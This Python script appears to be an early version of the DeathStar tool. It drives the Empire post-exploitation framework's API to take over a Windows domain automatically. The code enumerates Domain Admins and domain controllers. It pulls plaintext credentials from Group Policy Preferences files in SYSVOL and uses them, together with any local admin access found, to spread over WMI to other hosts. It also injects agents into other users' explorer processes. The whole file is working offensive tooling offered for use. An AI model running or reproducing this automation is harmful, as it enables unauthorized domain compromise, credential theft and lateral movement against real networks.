import requests
import argparse
import os
import threading
import signal
import sys
import re
from time import sleep
from requests import ConnectionError
from IPython import embed

#The following disables the InsecureRequests warning and the 'Starting new HTTPS connection' log message
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class KThread(threading.Thread):
    """
    A subclass of threading.Thread, with a kill() method.
    From https://web.archive.org/web/20130503082442/http://mail.python.org/pipermail/python-list/2004-May/281943.html
    """

    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False

    def start(self):
        """Start the thread."""
        self.__run_backup = self.run
        self.run = self.__run      # Force the Thread toinstall our trace.
        threading.Thread.start(self)

    def __run(self):
        """Hacked run function, which installs the trace."""
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup

    def globaltrace(self, frame, why, arg):
        if why == 'call':
            return self.localtrace
        else:
            return None

    def localtrace(self, frame, why, arg):
        if self.killed:
            if why == 'line':
                raise SystemExit()
        return self.localtrace

    def kill(self):
        self.killed = True

def login(empire_username, empire_password):

    payload = {'username': empire_username,
               'password': empire_password}

    print('[*] Powering up the Death Star')
    r = requests.post(base_url + '/api/admin/login', json=payload, headers=headers, verify=False)

    if r.status_code == 200:
        token['token'] = r.json()['token']
    else:
        print('[-] I find your lack of faith disturbing... (Authentication Failed)')
        sys.exit(1)

def get_listener_by_name(listener_name='DeathStar'):
    r = requests.get(base_url + '/api/listeners/{}'.format(listener_name), params=token, verify=False)
    if r.status_code == 200:
        return r.json()
    return False

def start_listener(listener_options, listener_type='http'):
    r = requests.post(base_url + '/api/listeners/{}'.format(listener_type), params=token, headers=headers, json=listener_options, verify=False)
    if r.status_code == 200:
        r = r.json()
        print('[*] Created Death Star listener => {}'.format(r))
        return r
    print(r.json())
    raise

def get_agents():
    r = requests.get(base_url + '/api/agents', params=token, verify=False)
    if r.status_code == 200:
        return r.json()
    print(r.json())
    raise

def get_agent_results(agent_name):
    r = requests.get(base_url + '/api/agents/{}/results'.format(agent_name), params=token, verify=False)
    if r.status_code == 200:
        return r.json()
    print(r.json())
    raise

def run_shell_command(agent_name, command):
    payload = { 'command': command} 

    r = requests.post(base_url + '/api/agents/{}/shell'.format(agent_name), params=token, headers=headers, json=payload, verify=False)
    if r.status_code == 200:
        r = r.json()
        if debug: print("[DEBUG] Agent: {} Executed Shell Command => success: {} taskID: {}".format(agent_name, r['success'], r['taskID']))
        return r
    print(r.json())
    raise

def run_shell_command_with_results(agent_name, command):
    r = run_shell_command(agent_name, command)
    while True:
        for result in get_agent_results(agent_name)['results']:
            #if debug: print('[DEBUG] Agent: {} => Result Buffer: {}'.format(agent_name, result))
            if result['taskID'] == r['taskID']:
                if len(result['results'].split('\n')) > 1:
                    return result['results']
        sleep(2)

def execute_module(module_name, agent_name, module_options=None):
    payload = {'Agent': agent_name}
    if module_options:
        payload.update(module_options)

    r = requests.post(base_url + '/api/modules/{}'.format(module_name), params=token, headers=headers, json=payload, verify=False)
    if r.status_code == 200:
        r = r.json()
        if debug: print("[DEBUG] Agent: {} Executed Module => success: {} taskID: {} msg: '{}'".format(agent_name, r['success'], r['taskID'], r['msg']))
        return r
    print(r.json())
    raise

def execute_module_with_results(module_name, agent_name, module_options=None):
    r = execute_module(module_name, agent_name, module_options)
    while True:
        for result in get_agent_results(agent_name)['results']:
            #if debug: print('[DEBUG] Agent: {} => Result Buffer: {}'.format(agent_name, result))
            if result['taskID'] == r['taskID']:
                if len(result['results'].split('\n')) > 1:
                    return result['results']
        sleep(2)

def get_agent_logged_events(agent_name):
    r = requests.get(base_url + '/api/reporting/agent/{}'.format(agent_name), params=token, verify=False)
    if r.status_code == 200:
        return r.json()
    print(r.json())
    raise

def delete_all_agent_results():
    r = requests.delete(base_url + '/api/agents/all/results', params=token, verify=False)
    if r.status_code == 200:
        return r.json()
    print(r.json())
    raise

###########################################################################################################################################

def get_group_member(agent_name, group_name='"Domain Admins"'):
    module_options = {'GroupName': group_name}

    results = execute_module_with_results('powershell/situational_awareness/network/powerview/get_group_member', agent_name, module_options)
    results = results.strip().split('\r\n')
    members = []
    for entry in results:
        if entry.startswith('MemberName'):
            members.append(entry.split(':')[1].strip())

    print("[+] Agent: {} => Found {} members for the '{}' group: {}".format(agent_name, len(members), group_name, members))

    return members

def get_domain_controller(agent_name):
    results = execute_module_with_results('powershell/situational_awareness/network/powerview/get_domain_controller', agent_name)
    results = results.strip().split('\r\n')
    dcs = []
    for entry in results:
        if entry.startswith('Name'):
            dcs.append(entry.split(':')[1].strip())

    print('[+] Agent: {} => Found {} Domain Controllers: {}'.format(agent_name, len(dcs), dcs))

    return dcs

def find_localadmin_access(agent_name, threads=None, no_ping=False):
    module_options = {}
    if threads:
      module_options['Threads'] = int(threads)
    if no_ping:
      module_options['NoPing'] = bool(no_ping)

    results = execute_module_with_results('powershell/situational_awareness/network/powerview/find_localadmin_access', agent_name, module_options)
    if results.startswith('Job'):
        results = results.strip()[19:].split('\r\n')
    else:
        results = results.strip().split('\r\n')

    # Deletes the '\nFind-LocalAdminAccess completed!' string
    del results[-1]
    # Deletes a rogue '\n'
    del results[-1]

    print('[+] Agent: {} UserName:{} => Has admin access to {} hosts'.format(agent_name, agents[agent_name]['username'], len(results)))

    return results

def find_gpo_location(agent_name):
    pass

def find_gpo_computer_admin(agent_name):
    pass

def get_gpo_computer(agent_name, GUID):
    module_options = {'GUID': GUID}
    results = execute_module_with_results('powershell/situational_awareness/network/powerview/get_gpo_computer', agent_name, module_options)
    if results.startswith('Job'):
        results = results.strip()[19:].split('\r\n')
    else:
        results = results.strip().split('\r\n')

    # Deletes the '\nGet-GPOComputer completed!' string
    del results[-1]
    # Deletes a rogue '\n'
    del results[-1]

    print('[+] Agent: {} => GPO {} is applied to {} computers'.format(agent_name, GUID, len(results)))

    return results

def tokens(agent_name):
    results = execute_module_with_results('powershell/credentials/tokens', agent_name)
    embed()

def gpp(agent_name):
    results = execute_module_with_results('powershell/privesc/gpp', agent_name)
    results = results.split('\r\n\r\n')
    gpps = []
    for result in results:
        entries = result.split('\r\n')
 
        gpp = {}
        usernames = []
        passwords = []
        file = None
        for entry in entries:
            if entry.startswith('UserNames'):
                usernames = list(map(str.strip, entry.split(':')[1].strip().split(',')))
                if usernames: 
                    usernames[0]  = usernames[0][1:]
                    usernames[-1] = usernames[-1][:-1]
                    # Some usernames get returned with '(built-in) appended to them, this takes care of that
                    usernames = [user.replace(' (built-in)', '') for user in usernames]

            if entry.startswith('Passwords'):
                passwords = list(map(str.strip, entry.split(':')[1].strip().split(',')))
                if passwords: 
                    passwords[0]  = passwords[0][1:]
                    passwords[-1] = passwords[-1][:-1]

            if entry.startswith('File'):
                file = entry.split(':')[1].strip()

        if file is not None and (usernames and passwords):
            gpp['file'] = file
            gpp['guid'] = file.split('\\')[6][1:-1]
            gpp['creds'] = dict(zip(usernames, passwords))
            gpps.append(gpp)

    print('[+] Agent: {} => Found {} credentials using GPP SYSVOL privesc'.format(agent_name, len(gpps)))

    return gpps

def get_loggedon(agent_name, computer_name='localhost'):
    module_options = {'ComputerName': computer_name}

    results = execute_module_with_results('powershell/situational_awareness/network/powerview/get_loggedon', agent_name, module_options)
    results = results.strip().split('\r\n')[4:-4]

    loggedon_users = []
    for entry in results:
        if not entry or entry.find('$') != -1:
            continue

        entry = re.sub(' +', ' ', entry.strip())
        username, domain, logon_server,_= entry.split()
        user = '{}\\{}'.format(domain, username)
        if user not in loggedon_users:
            loggedon_users.append(user)

    print('[+] Agent: {} => Found {} users logged into {}: {}'.format(agent_name, len(loggedon_users), computer_name, loggedon_users))

    return loggedon_users

def tasklist(agent_name, process=None, username=None):
    command = 'tasklist'
    if process:
        command += ' {}'.format(process)

    results = run_shell_command_with_results(agent_name, command)
    results = results.split('\r\n')[2:]

    processes = []

    for entry in results:
        # This is convoluted because it takes into account process names with multiple spaces
        entry = re.sub('  +', '_', entry.strip())

        try:
            name, pid_arch, user,_= entry.split('_')
            pid, arch = pid_arch.split()
        except ValueError:
            try:
                name, pid_arch, user_memusage = entry.split('_')
                user,_,_= user_memusage.split()
                pid, arch = pid_arch.split()
            except ValueError:
                name_pid_arch, user, memusage = entry.split('_')
                name, pid, arch = name_pid_arch.split()

        if username and username == user.split('\\')[1]:
            processes.append({'name': name, 'pid': pid, 'arch': arch, 'username': user})
        else:
            processes.append({'name': name, 'pid': pid, 'arch': arch, 'username': user})

    print('[+] Agent: {} => Enumerated {} processes'.format(agent_name, len(processes)))

    return processes

def psinject(agent_name, listener, process):
    module_options = {}
    if process.isdigit():
        module_options['ProcId'] = process
    else:
        module_options['ProcName'] = process
    module_options['Listener'] = listener

    print('[*] Agent: {} UserName: {} => Perforiming PSInject into process {}'.format(agent_name, agents[agent_name]['username'], process))
    execute_module('powershell/management/psinject', agent_name, module_options)

def invoke_wmi(agent_name, computer_name, listener, username=None, password=None):
    module_options = {'ComputerName': computer_name,
                      'Listener': listener}

    if username and password:
        module_options['UserName'] = username
        module_options['Password'] = password

    print('[*] Agent: {} UserName: {} => Spreading laterally to {}'.format(agent_name, agents[agent_name]['username'], computer_name))
    execute_module('powershell/lateral_movement/invoke_wmi', agent_name, module_options)

#########################################################################################################################################

def recon(agent_name):
    if not_running_under_localaccount(agent_name):
        print('[*] Tasking Agent {} to perform Recon'.format(agent_name))
        for member in get_group_member(agent_name):
            domain_admins.append(member)

        for dc in get_domain_controller(agent_name):
            domain_controllers.append(dc)

        #del recon_threads[agent_name]

def privesc(agent_name):
    if not_running_under_localaccount(agent_name):
        print('[*] Tasking Agent {} to perform Domain Privesc'.format(agent_name))
        for result in gpp(agent_name):
            for box in get_gpo_computer(agent_name, result['guid']):
                for username, password in result['creds'].items():
                    # These are local accounts so we append '.\' to the username to specify it
                    invoke_wmi(agent_name, box, 'DeathStar', '.\\' + username, password)

        tried_domain_privesc = True

def pwn_the_shit_out_of_everything(agent_name):
    '''
    This is the function that takes care of the logic for each agent thread
    '''

    if (not domain_controllers or not domain_admins): #and not recon_threads:
        recon(agent_name)
        #recon_threads[agent_name] = KThread(target=recon, args=(agent_name,))
        #recon_threads[agent_name].start()

    if not privesc_threads and not tried_domain_privesc:
        privesc_threads[agent_name] = KThread(target=privesc, args=(agent_name,))
        privesc_threads[agent_name].start()

    if agents[agent_name]['username'] not in spread_usernames and not_running_under_localaccount(agent_name):
        for box in find_localadmin_access(agent_name):
            invoke_wmi(agent_name, box, 'DeathStar')
        spread_usernames.append(agents[agent_name]['username'])

    loggedon_users = get_loggedon(agent_name)

    for result in loggedon_users:
        domain, username = result.split('\\')
        if domain_admins:
            if username in domain_admins:
                print('[+] Agent: {} => Found Domain Admin logged in!'.format(agent_name))

    #elevate()

    if agents[agent_name]['high_integrity']:
    #    tokens(agent_name)
        # This doesn't need to be explorer, change it at will ;)
        for process in tasklist(agent_name, process='explorer'):
            if process['username'] != agents[agent_name]['username'] and process['username'] != 'N/A' and process['username'] not in spread_usernames:
                psinject(agent_name, 'DeathStar', process['pid'])

        #powerdump()
        #mimikatz()

############################################################################################################################################

def not_running_under_localaccount(agent_name):
    if agents[agent_name]['hostname'] != agents[agent_name]['username'].split('\\')[0]:
        return True
    return False

def signal_handler(signal, frame):
    print('\n[*] Powering down...')
    for name, thread in recon_threads.items():
        print('[*] Killing recon thread for agent {}'.format(name))
        thread.kill()
    
    for name, thread in privesc_threads.items():  
        print('[*] Killing privesc thread for agent {}'.format(name))
        thread.kill()

    for name, thread in agent_threads.items():
        print('[*] Killing thread for agent {}'.format(name))
        thread.kill()

    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)


if __name__ == '__main__':

    logo = """
                                 .;+###+;.                             
                            .#@@@@@@@@@@@@@@                           
                         `@@@@@@@@@@@@@@+                              
                       ;@@@@@@@@@@@@@@@@@@@@                           
                     ;@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
                   `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
                  #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@'                   
                @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                  
              `@@@@@@,     `@@@@@@@@@@@@@@@@@@@@@@@@@@@@               
             `@@@@@`  '@@@@` .@@@@@@@@@@@@@@@@@@@@@@@@                 
             @@@@@  @@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@                 
            @@@@# '@@@@@@@@@@@ ,@@@@@@@@@@@@@@@@@@@@@                  
           @@@@@ +@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@                  
          #@@@@ '@@@@@@@@@@@@@@``@@@@@@@@@@@@@@@@@@@@@                 
         `@@@@. @@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@++##'           
         @@@@@ @@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@           
        :@@@@`.@@@@@@@@@@@@@@@@@ +@@@@@@@@@@@@@@@@@@@@@#               
        @@@@@ @@@@@@@@@@@@@@@@@@ ;@@@@@@@@@@@@@@@@@@@@@@.              
       '@@@@@ @@@@@@@@@@@@@@@@@@ +@@@@@@@@@@@@@@@@@@@@@@@.             
       @@@@@,.@@@@@@@@@@'@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@#              
      .@@@@@ ;@@@@@@@@@. @@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@               
      @@@@@@ '@@@@@@@@@@'@@@@@@' @@@@@@@@@@@@@@@@@@@@@@@               
      @@@@@@ :@@@@@@@@@@@@@@@@@ '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;      
     ,@@@@@@` @@@@@@@@@@@@@@@@# @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:      
     @@@@@@@+ @@@@@@@@@@@@@@@@ '@@@@@@@@@@@@@@@@@@@@@@@@@@             
     @@@@@@@@ +@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@+        ``   
     @@@@@@@@. @@@@@@@@@@@@@. @@@@@@@@@@@@@@@@@@@@@@@@@@@+::      @@   
     @@@@@@@@@ `@@@@@@@@@@@` @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;     @@   
    .@@@@@@@@@@  @@@@@@@@#  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;@@  ;
    ;@@@@@@@@@@@  ,@@@@:  `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@
    +@@@@@@@@@@@@@      `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    # @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@`
    +@# @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@' @
    '@@@@ ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@; @@@
    ,@@@@@@; '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ :@@@@+
     @@@@@@@@@' `#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@; :@@@@@@+ 
     @@@@@@@@@@@@@'  .+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+, :@@@@@@@@@@  
     @@@@@@@@@@@@@@@@@@+,   `,;+@@@@@@@@@@@@@@@+:.  `;@@@@@@@@@@@;@@   
     @@@@@@@@@@@@@@@@@@@@@@@@@@@#+;;::,,::;'+@@@@@@@@@@@@@@@@@@@  @@   
     :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   @@   
      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   ,,   
      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@        
      ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@        
       ''#@@@@@@@@@   '++@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+;      
          @# #@@@@@      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,,,,,,,,,,      
          '@@@@@@@@   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                
           @@         @@@@@@@@@;''@@@@@@@@@@@@@@@@@@@@@                
           @@      .:;@@@@`..`    `@@@@@@@@@@@@@@@@@@@@@@@@@@`         
                   #@@@@:.        `@@@@@@@@@@@@@@@@@@@@@@@@@@          
                      '@,      @@@@@@@@@@@@@@@@@@                      
           ''.    ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ``             
            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@            
            ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                
             '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#,,,,,,:,                
              '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:                        
               :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                    
                `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,:                      
                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@                        
                   '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
                     @@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
                       @@@@@@@@@@@@@@@@@,                              
                         +@@@@@@@@@@@@@@                               
                            #@@@@@@@@@@@@`                             
                                :#@@@@@@@

                       Yes, it's fully operational.
    """

args = argparse.ArgumentParser(description='Death Star')
args.add_argument('-u', '--username', type=str, default='empireadmin', help='Empire username')
args.add_argument('-p', '--password', type=str, default='Password123', help='Empire password')
args.add_argument('-t', '--threads', type=int,  help='Specifies the number of threads for modules to use')
args.add_argument('--url', type=str, default='https://127.0.0.1:1337', help='Empire RESTful API URL')
args.add_argument('--debug', action='store_true', help='Enable debug output')

args = args.parse_args()

print(logo)
sleep(3)
os.system('clear')

headers = {'Content-Type': 'application/json'}
token = {'token': None}

base_url = args.url
debug = args.debug

agent_threads = {}
agents  = {}
recon_threads = {}

tried_domain_privesc = False
privesc_threads = {}

domain_controllers = []
domain_admins      = []
spread_usernames   = [] # List of accounts we already used to laterally spread

login(args.username, args.password)

if not get_listener_by_name():
    start_listener({'CertPath': 'data/empire.pem', 'Name': 'DeathStar', 'Port': 7654})

#delete_all_agent_results()

print('[*] Polling for agents')
while True:
    for agent in get_agents()['agents']:
        agent_name = agent['name']
        if agent_name not in agents.keys():
            print('[+] New agent => ID: {} Name: {} IP: {} HostName: {} UserName: {} HighIntegrity: {}'.format(agent['ID'], agent['name'], agent['external_ip'], agent['hostname'], agent['username'], agent['high_integrity']))
            agents[agent_name] = {'id': agent['ID'],
                                       'ip': agent['external_ip'], 
                                       'hostname': agent['hostname'], 
                                       'username': agent['username'], 
                                       'high_integrity': agent['high_integrity']}

            agent_threads[agent_name] = KThread(target=pwn_the_shit_out_of_everything, args=(agent_name,))
            agent_threads[agent_name].start()

    sleep(5)

sys.exit(0)